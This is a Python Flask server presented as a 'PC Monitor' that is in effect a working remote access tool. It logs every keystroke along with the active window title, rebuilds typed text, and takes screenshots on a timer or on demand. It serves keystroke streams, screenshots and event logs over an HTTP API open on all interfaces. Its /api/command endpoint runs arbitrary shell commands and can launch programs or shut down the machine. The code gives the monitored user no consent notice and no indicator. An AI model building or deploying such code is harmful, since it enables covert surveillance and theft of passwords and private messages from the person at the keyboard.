import json
import os
import base64
import secrets
from datetime import datetime, timedelta
from pathlib import Path
from threading import Thread, Lock
import time
import queue
import subprocess
import sys
import signal

from flask import Flask, request, jsonify
from flask_cors import CORS
from pynput import mouse, keyboard
from PIL import ImageGrab

try:
    import win32gui
    import win32process
    import psutil
    WINDOWS_SUPPORT = True
except ImportError:
    WINDOWS_SUPPORT = False
    print("Warning: Windows-specific features disabled (win32gui/psutil not available)")

app = Flask(__name__)
CORS(app)

# Configuration
CONFIG_FILE = "config.json"
DATA_DIR = Path("monitor_data")
SCREENSHOTS_DIR = DATA_DIR / "screenshots"
OFFLINE_LOGS_DIR = DATA_DIR / "offline_logs"

# Ensure directories exist
DATA_DIR.mkdir(exist_ok=True)
SCREENSHOTS_DIR.mkdir(exist_ok=True)
OFFLINE_LOGS_DIR.mkdir(exist_ok=True)

# Global state - Initialize with None
monitoring = False
events = []
events_lock = Lock()
keystroke_buffer = []
keystroke_lock = Lock()
live_keystroke_queue = queue.Queue(maxsize=1000)
last_screenshot_time = None
auto_screenshot_enabled = False
auto_screenshot_interval = 300  # 5 minutes default
screenshot_history = []
offline_mode = False
offline_buffer = []

# Motion detection
last_mouse_pos = None
last_activity_time = datetime.now()

# Multi-PC support - Will be set after loading config
pc_id = None
API_KEY = None
config = None

def load_config():
    """Load configuration from file"""
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    
    # Generate default config
    config = {
        "api_key": secrets.token_urlsafe(32),
        "port": 5000,
        "host": "0.0.0.0",
        "auto_screenshot": False,
        "screenshot_interval": 300,
        "motion_detection": False,
        "data_retention_days": 30,
        "pc_id": secrets.token_hex(8),
        "pc_name": os.environ.get('COMPUTERNAME', 'Unknown-PC')
    }
    
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)
    
    print(f"\n{'='*70}")
    print("FIRST TIME SETUP - Configuration Created")
    print(f"{'='*70}")
    print(f"API Key: {config['api_key']}")
    print(f"Port: {config['port']}")
    print(f"\nSave this API key - you'll need it in the client!")
    print(f"{'='*70}\n")
    
    return config

# Load configuration and set globals
config = load_config()
API_KEY = config['api_key']
pc_id = config['pc_id']

# Authentication decorator
def require_auth(f):
    def decorated(*args, **kwargs):
        api_key = request.headers.get('X-API-Key')
        if api_key != API_KEY:
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    decorated.__name__ = f.__name__
    return decorated

# Event logging
def log_event(event_type, details=None):
    """Log an event with timestamp"""
    global offline_mode, offline_buffer
    
    event = {
        "timestamp": datetime.now().isoformat(),
        "type": event_type,
        "details": details or {},
        "pc_id": pc_id
    }
    
    with events_lock:
        events.append(event)
        
        # Limit memory usage
        if len(events) > 10000:
            events.pop(0)
    
    # Handle offline mode
    if offline_mode:
        offline_buffer.append(event)
        save_offline_log(event)
    
    return event

def save_offline_log(event):
    """Save event to offline log file"""
    try:
        date_str = datetime.now().strftime("%Y-%m-%d")
        log_file = OFFLINE_LOGS_DIR / f"offline_{date_str}.jsonl"
        
        with open(log_file, 'a') as f:
            f.write(json.dumps(event) + '\n')
    except Exception as e:
        print(f"Error saving offline log: {e}")

def sync_offline_logs():
    """Sync offline logs when connection restored"""
    global offline_buffer
    
    if offline_buffer:
        print(f"Syncing {len(offline_buffer)} offline events...")
        with events_lock:
            events.extend(offline_buffer)
        offline_buffer = []

# Keystroke buffering and live streaming
def process_keystroke(key):
    """Process keystroke for both logging and live streaming"""
    try:
        char = key.char if hasattr(key, 'char') else str(key)
    except AttributeError:
        char = str(key)
    
    timestamp = datetime.now().isoformat()
    window = get_active_window_title()
    
    # Add to keystroke buffer
    with keystroke_lock:
        keystroke_buffer.append({
            "timestamp": timestamp,
            "key": char,
            "window": window
        })
        
        # Limit buffer size
        if len(keystroke_buffer) > 5000:
            keystroke_buffer.pop(0)
    
    # Add to live queue (non-blocking)
    try:
        live_keystroke_queue.put_nowait({
            "timestamp": timestamp,
            "key": char,
            "window": window
        })
    except queue.Full:
        # Drop oldest item and add new one
        try:
            live_keystroke_queue.get_nowait()
            live_keystroke_queue.put_nowait({
                "timestamp": timestamp,
                "key": char,
                "window": window
            })
        except:
            pass

def format_keystrokes_to_text(keystrokes):
    """Convert raw keystrokes to readable text"""
    text = ""
    for ks in keystrokes:
        key = ks['key']
        
        # Filter special keys
        if key.startswith('Key.'):
            key_name = key.replace('Key.', '')
            if key_name == 'space':
                text += ' '
            elif key_name == 'enter':
                text += '\n'
            elif key_name == 'backspace':
                text = text[:-1] if text else text
            elif key_name == 'tab':
                text += '\t'
            # Ignore other special keys
        else:
            text += key
    
    return text

# Window tracking
current_window = None

def get_active_window_title():
    """Get the title of the currently active window"""
    if not WINDOWS_SUPPORT:
        return "Unknown"
    
    try:
        window = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(window)
    except:
        return "Unknown"

def get_active_window_process():
    """Get process name of active window"""
    if not WINDOWS_SUPPORT:
        return "Unknown"
    
    try:
        window = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(window)
        process = psutil.Process(pid)
        return process.name()
    except:
        return "Unknown"

# Mouse listener
def on_click(x, y, button, pressed):
    global last_mouse_pos, last_activity_time
    
    if pressed and monitoring:
        last_mouse_pos = (x, y)
        last_activity_time = datetime.now()
        
        log_event("mouse_click", {
            "x": x,
            "y": y,
            "button": str(button),
            "window": get_active_window_title()
        })

def on_move(x, y):
    global last_mouse_pos, last_activity_time
    
    if monitoring:
        # Only update if significant movement (reduces spam)
        if last_mouse_pos is None or \
           abs(x - last_mouse_pos[0]) > 50 or abs(y - last_mouse_pos[1]) > 50:
            last_mouse_pos = (x, y)
            last_activity_time = datetime.now()

# Keyboard listener
def on_press(key):
    if monitoring:
        process_keystroke(key)
        
        # Only log special keys in events
        if not hasattr(key, 'char'):
            log_event("key_press", {
                "key": str(key),
                "window": get_active_window_title(),
                "process": get_active_window_process()
            })

# Window change monitor
def monitor_window_changes():
    """Monitor active window changes"""
    global current_window
    
    while monitoring:
        try:
            window = get_active_window_title()
            if window != current_window and window != "Unknown":
                current_window = window
                log_event("window_change", {
                    "title": window,
                    "process": get_active_window_process()
                })
        except:
            pass
        time.sleep(1)

# Screenshot management
def take_screenshot():
    """Capture and save screenshot"""
    try:
        screenshot = ImageGrab.grab()
        
        # Generate filename
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{timestamp}.png"
        filepath = SCREENSHOTS_DIR / filename
        
        screenshot.save(filepath, "PNG")
        
        # Add to history
        screenshot_history.append({
            "filename": filename,
            "timestamp": datetime.now().isoformat(),
            "path": str(filepath)
        })
        
        # Limit history
        if len(screenshot_history) > 100:
            old = screenshot_history.pop(0)
            # Delete old file
            try:
                os.remove(old['path'])
            except:
                pass
        
        log_event("screenshot", {"filename": filename})
        
        return filepath
    except Exception as e:
        print(f"Screenshot error: {e}")
        return None

def auto_screenshot_thread():
    """Background thread for automatic screenshots"""
    global last_screenshot_time, last_activity_time, config
    
    while True:
        time.sleep(10)  # Check every 10 seconds
        
        if not monitoring or not auto_screenshot_enabled or config is None:
            continue
        
        now = datetime.now()
        
        # Check if it's time for a screenshot
        if last_screenshot_time is None or \
           (now - last_screenshot_time).total_seconds() >= auto_screenshot_interval:
            
            # Motion detection check
            if config.get('motion_detection', False):
                # Only screenshot if there was recent activity
                if (now - last_activity_time).total_seconds() > 60:
                    continue  # No recent activity, skip screenshot
            
            take_screenshot()
            last_screenshot_time = now

# Data cleanup
def cleanup_old_data():
    """Remove old data based on retention policy"""
    if config is None:
        retention_days = 30  # default if config not available
    else:
        retention_days = config.get('data_retention_days', 30)
    cutoff_date = datetime.now() - timedelta(days=retention_days)
    
    # Clean screenshots
    for img_file in SCREENSHOTS_DIR.glob("*.png"):
        try:
            file_time = datetime.fromtimestamp(img_file.stat().st_mtime)
            if file_time < cutoff_date:
                img_file.unlink()
        except:
            pass
    
    # Clean offline logs
    for log_file in OFFLINE_LOGS_DIR.glob("*.jsonl"):
        try:
            file_time = datetime.fromtimestamp(log_file.stat().st_mtime)
            if file_time < cutoff_date:
                log_file.unlink()
        except:
            pass

# Start monitoring threads
mouse_listener = None
keyboard_listener = None
window_thread = None

def start_monitoring():
    """Start all monitoring threads"""
    global monitoring, mouse_listener, keyboard_listener, window_thread
    global last_screenshot_time
    
    if monitoring:
        return {"status": "already_running"}
    
    monitoring = True
    last_screenshot_time = None
    
    # Start mouse listener
    mouse_listener = mouse.Listener(on_click=on_click, on_move=on_move)
    mouse_listener.start()
    
    # Start keyboard listener
    keyboard_listener = keyboard.Listener(on_press=on_press)
    keyboard_listener.start()
    
    # Start window monitor
    window_thread = Thread(target=monitor_window_changes, daemon=True)
    window_thread.start()
    
    log_event("monitoring_started")
    
    return {"status": "started", "pc_id": pc_id}

def stop_monitoring():
    """Stop all monitoring"""
    global monitoring, mouse_listener, keyboard_listener
    
    if not monitoring:
        return {"status": "already_stopped"}
    
    monitoring = False
    
    if mouse_listener:
        mouse_listener.stop()
    if keyboard_listener:
        keyboard_listener.stop()
    
    log_event("monitoring_stopped")
    
    return {"status": "stopped", "pc_id": pc_id}

# API Endpoints

@app.route('/api/status', methods=['GET'])
def status():
    """Get current monitoring status"""
    pc_name = config.get('pc_name', 'Unknown') if config is not None else 'Unknown'
    return jsonify({
        "monitoring": monitoring,
        "event_count": len(events),
        "keystroke_count": len(keystroke_buffer),
        "screenshot_count": len(screenshot_history),
        "pc_id": pc_id,
        "pc_name": pc_name,
        "auto_screenshot": auto_screenshot_enabled,
        "offline_mode": offline_mode
    })

@app.route('/api/start', methods=['POST'])
@require_auth
def start():
    """Start monitoring"""
    result = start_monitoring()
    return jsonify(result)

@app.route('/api/stop', methods=['POST'])
@require_auth
def stop():
    """Stop monitoring"""
    result = stop_monitoring()
    return jsonify(result)

@app.route('/api/kill', methods=['POST'])
@require_auth
def kill_server():
    """Kill the server process"""
    log_event("server_killed", {"source": "remote_client"})
    
    # Stop monitoring first
    stop_monitoring()
    
    # Return response before killing
    response = jsonify({"status": "server_killed", "message": "Server shutting down..."})
    
    # Schedule shutdown after response is sent
    def shutdown():
        time.sleep(1)
        print("\n[!] Server killed by remote client")
        os.kill(os.getpid(), signal.SIGTERM)
    
    Thread(target=shutdown, daemon=True).start()
    
    return response

@app.route('/api/events', methods=['GET'])
@require_auth
def get_events():
    """Get logged events"""
    limit = int(request.args.get('limit', 100))
    event_type = request.args.get('type', None)
    search = request.args.get('search', None)
    start_date = request.args.get('start_date', None)
    end_date = request.args.get('end_date', None)
    
    with events_lock:
        filtered = events.copy()
    
    # Apply filters
    if event_type:
        filtered = [e for e in filtered if e['type'] == event_type]
    
    if search:
        search_lower = search.lower()
        filtered = [e for e in filtered if 
                   search_lower in str(e.get('details', {})).lower() or
                   search_lower in e['type'].lower()]
    
    if start_date:
        try:
            start_dt = datetime.fromisoformat(start_date)
            filtered = [e for e in filtered if datetime.fromisoformat(e['timestamp']) >= start_dt]
        except:
            pass
    
    if end_date:
        try:
            end_dt = datetime.fromisoformat(end_date)
            filtered = [e for e in filtered if datetime.fromisoformat(e['timestamp']) <= end_dt]
        except:
            pass
    
    return jsonify(filtered[-limit:])

@app.route('/api/keystrokes/live', methods=['GET'])
@require_auth
def get_live_keystrokes():
    """Get live keystroke stream (non-blocking)"""
    keystrokes = []
    
    try:
        while not live_keystroke_queue.empty():
            keystrokes.append(live_keystroke_queue.get_nowait())
            if len(keystrokes) >= 50:  # Limit batch size
                break
    except queue.Empty:
        pass
    
    return jsonify({
        "keystrokes": keystrokes,
        "text": format_keystrokes_to_text(keystrokes)
    })

@app.route('/api/keystrokes/buffer', methods=['GET'])
@require_auth
def get_keystroke_buffer():
    """Get buffered keystrokes"""
    limit = int(request.args.get('limit', 1000))
    format_as_text = request.args.get('format', 'json') == 'text'
    
    with keystroke_lock:
        buffer = keystroke_buffer[-limit:]
    
    if format_as_text:
        return jsonify({
            "text": format_keystrokes_to_text(buffer),
            "count": len(buffer)
        })
    else:
        return jsonify(buffer)

@app.route('/api/snapshot', methods=['POST'])
@require_auth
def snapshot():
    """Take an immediate screenshot"""
    filepath = take_screenshot()
    if filepath:
        return jsonify({"status": "success", "filename": filepath.name})
    return jsonify({"error": "Failed to capture screenshot"}), 500

@app.route('/api/screenshot/latest', methods=['GET'])
@require_auth
def get_latest_screenshot():
    """Get the most recent screenshot"""
    if not screenshot_history:
        return jsonify({"error": "No screenshots available"}), 404
    
    latest = screenshot_history[-1]
    
    try:
        with open(latest['path'], 'rb') as f:
            image_data = base64.b64encode(f.read()).decode('utf-8')
        
        return jsonify({
            "image": image_data,
            "timestamp": latest['timestamp'],
            "filename": latest['filename']
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/screenshot/history', methods=['GET'])
@require_auth
def get_screenshot_history():
    """Get screenshot history list"""
    return jsonify(screenshot_history)

@app.route('/api/screenshot/<filename>', methods=['GET'])
@require_auth
def get_screenshot(filename):
    """Get specific screenshot by filename"""
    filepath = SCREENSHOTS_DIR / filename
    
    if not filepath.exists():
        return jsonify({"error": "Screenshot not found"}), 404
    
    try:
        with open(filepath, 'rb') as f:
            image_data = base64.b64encode(f.read()).decode('utf-8')
        
        return jsonify({"image": image_data, "filename": filename})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/settings/screenshot', methods=['POST'])
@require_auth
def update_screenshot_settings():
    """Update automatic screenshot settings"""
    global auto_screenshot_enabled, auto_screenshot_interval
    
    data = request.json or {}
    
    if 'enabled' in data:
        auto_screenshot_enabled = data['enabled']
    
    if 'interval' in data:
        auto_screenshot_interval = int(data['interval'])
    
    # Update config
    global config
    if config is None:
        config = {}
    config['auto_screenshot'] = auto_screenshot_enabled
    config['screenshot_interval'] = auto_screenshot_interval
    
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)
    
    return jsonify({
        "enabled": auto_screenshot_enabled,
        "interval": auto_screenshot_interval
    })

@app.route('/api/command', methods=['POST'])
@require_auth
def execute_command():
    """Execute remote command"""
    data = request.json or {}
    cmd_type = data.get('type')
    
    try:
        if cmd_type == 'shutdown':
            log_event("remote_command", {"type": "shutdown"})
            subprocess.Popen(['shutdown', '/s', '/t', '10'])
            return jsonify({"status": "shutdown initiated"})
        
        elif cmd_type == 'restart':
            log_event("remote_command", {"type": "restart"})
            subprocess.Popen(['shutdown', '/r', '/t', '10'])
            return jsonify({"status": "restart initiated"})
        
        elif cmd_type == 'launch':
            app_path = data.get('path')
            if not app_path or not isinstance(app_path, str):
                return jsonify({"error": "Invalid application path"}), 400
            log_event("remote_command", {"type": "launch", "path": app_path})
            subprocess.Popen(app_path, shell=True)
            return jsonify({"status": "application launched"})
        
        elif cmd_type == 'shell':
            command = data.get('command')
            if not command or not isinstance(command, str):
                return jsonify({"error": "Invalid command"}), 400
            log_event("remote_command", {"type": "shell", "command": command})
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            return jsonify({
                "status": "executed",
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode
            })
        
        else:
            return jsonify({"error": "Unknown command type"}), 400
    
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/export', methods=['GET'])
@require_auth
def export_data():
    """Export all data"""
    export_type = request.args.get('type', 'events')
    
    if export_type == 'events':
        with events_lock:
            data = events.copy()
    elif export_type == 'keystrokes':
        with keystroke_lock:
            data = keystroke_buffer.copy()
    else:
        return jsonify({"error": "Invalid export type"}), 400
    
    return jsonify(data)

if __name__ == '__main__':
    print("="*70)
    print("PC MONITOR SERVER - Enhanced Edition")
    print("="*70)
    print(f"\nPC ID: {pc_id}")
    print(f"PC Name: {config.get('pc_name', 'Unknown')}")
    print(f"API Key: {API_KEY}")
    print(f"Port: {config['port']}")
    print(f"Host: {config['host']}")
    print(f"\nData directory: {DATA_DIR.absolute()}")
    print(f"Screenshots: {SCREENSHOTS_DIR.absolute()}")
    print("\nWindows Support:", "Enabled" if WINDOWS_SUPPORT else "Disabled")
    print("="*70)
    print("\nServer starting... Press Ctrl+C to stop")
    print("="*70)
    
    # Start background threads
    screenshot_thread = Thread(target=auto_screenshot_thread, daemon=True)
    screenshot_thread.start()
    
    # Load auto-screenshot settings
    auto_screenshot_enabled = config.get('auto_screenshot', False)
    auto_screenshot_interval = config.get('screenshot_interval', 300)
    
    # Start Flask server
    try:
        app.run(
            host=config['host'],
            port=config['port'],
            debug=False,
            threaded=True
        )
    except KeyboardInterrupt:
        print("\n\nServer stopped by user")
        stop_monitoring()
        sys.exit(0)